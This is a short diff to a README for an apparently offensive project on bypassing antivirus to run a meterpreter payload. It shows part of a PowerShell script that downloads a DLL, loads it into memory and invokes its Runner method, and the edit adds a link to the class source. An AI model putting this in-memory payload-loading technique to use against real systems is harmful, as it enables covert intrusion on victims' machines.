@@ -31,7 +31,7 @@ Now we just need to execute the .dll, so we do a .ps1 script to do that:
         $method = $class.GetMethod("Runner")
         $method.Invoke(0, $null)
 
-This PowerShell script will download the DLL, load it directly into memory, and invoke Runner function.
+This PowerShell script will download the DLL, load it directly into memory, and invoke Runner function of [_Class1_](https://github.com/marcoigorr/RS_meterpreter_bypass/blob/6e7cf2a56639a471bc8a45d42c06cf47eb2ff10d/Class1.cs).
 
 ## Victim's machine
 
